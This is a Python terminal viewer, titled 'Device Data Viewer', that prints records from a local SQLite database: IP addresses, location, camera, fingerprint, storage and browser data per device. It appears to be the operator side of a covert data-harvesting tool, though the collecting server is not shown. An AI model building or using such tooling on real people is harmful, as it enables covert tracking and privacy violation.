#!/usr/bin/env python3
import sqlite3
import json
import sys
from datetime import datetime
from pathlib import Path

DB_PATH = Path(__file__).parent / 'data.db'

def print_colored(text, color='white', bold=False):
    colors = {
        'red': '\033[91m', 'green': '\033[92m', 'cyan': '\033[96m',
        'yellow': '\033[93m', 'blue': '\033[94m', 'magenta': '\033[95m',
        'white': '\033[97m', 'reset': '\033[0m', 'bold': '\033[1m'
    }
    bold_code = colors['bold'] if bold else ''
    print(f"{bold_code}{colors.get(color, '')}{text}{colors['reset']}")

def view_entries(limit=10):
    if not DB_PATH.exists():
        print("Database not found. Run the server and collect some data first.")
        return

    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute('SELECT * FROM entries ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    if not rows:
        print("No entries found.")
        return

    print_colored("\n" + "="*70, 'cyan', True)
    print_colored("  Welcome TOMMY - Device Data Viewer", 'cyan', True)
    print_colored("="*70, 'cyan', True)
    print_colored(f"  Total Devices: {len(rows)}", 'yellow', True)
    print_colored("="*70 + "\n", 'cyan', True)

    for row in rows:
        user_id = row['user_id'] or 'Unknown'
        short_uid = user_id[:25] + '...' if len(user_id) > 25 else user_id
        
        print_colored("┌" + "─"*68 + "┐", 'cyan')
        print_colored("│" + f" Device #{row['id']}".ljust(68) + "│", 'cyan')
        print_colored("├" + "─"*68 + "┤", 'cyan')
        print_colored("│" + f" User: {short_uid}".ljust(68) + "│", 'white')
        print_colored("│" + f" Time: {row['timestamp'][:19]}".ljust(68) + "│", 'white')
        print_colored("│" + f" IP: {row['ip']}".ljust(68) + "│", 'white')
        print_colored("└" + "─"*68 + "┘", 'cyan')
        print()

        counter = 1
        if row['basic_data'] and row['basic_data'] != '{}':
            basic = json.loads(row['basic_data'])
            print_colored("  [BASIC INFO]", 'green', True)
            for k, v in basic.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        if row['device_data'] and row['device_data'] != '{}':
            device = json.loads(row['device_data'])
            print_colored("  [DEVICE INFO]", 'blue', True)
            for k, v in device.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        if row['cam_data'] and row['cam_data'] != '{}':
            cam = json.loads(row['cam_data'])
            print_colored("  [CAMERA INFO]", 'magenta', True)
            for k, v in cam.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        if row['geo_data'] and row['geo_data'] != '{}':
            geo = json.loads(row['geo_data'])
            print_colored("  [LOCATION INFO]", 'yellow', True)
            for k, v in geo.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        if row['fingerprint_data'] and row['fingerprint_data'] != '{}':
            fingerprint = json.loads(row['fingerprint_data'])
            print_colored("  [FINGERPRINT INFO]", 'red', True)
            for k, v in fingerprint.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        if row['storage_data'] and row['storage_data'] != '{}':
            storage = json.loads(row['storage_data'])
            print_colored("  [STORAGE INFO]", 'cyan', True)
            for k, v in storage.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        if row['browser_data'] and row['browser_data'] != '{}':
            browser = json.loads(row['browser_data'])
            print_colored("  [BROWSER INFO]", 'green', True)
            for k, v in browser.items():
                val = str(v)
                if len(val) > 75:
                    val = val[:75] + "..."
                print_colored(f"    {counter}. {k}: {val}", 'white')
                counter += 1
            print()

        print_colored("─" * 70, 'red')
        print_colored(f"  Total Items: {counter-1}", 'yellow', True)
        print_colored("─" * 70 + "\n", 'red')

def watch_mode():
    import time
    last_count = 0
    while True:
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM entries')
        count = c.fetchone()[0]
        conn.close()

        if count != last_count:
            print(f"\033[H\033[J", end="")
            view_entries(50)
            last_count = count
        time.sleep(2)

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--watch':
        watch_mode()
    else:
        limit = int(sys.argv[1]) if len(sys.argv) > 1 else 10
        view_entries(limit)
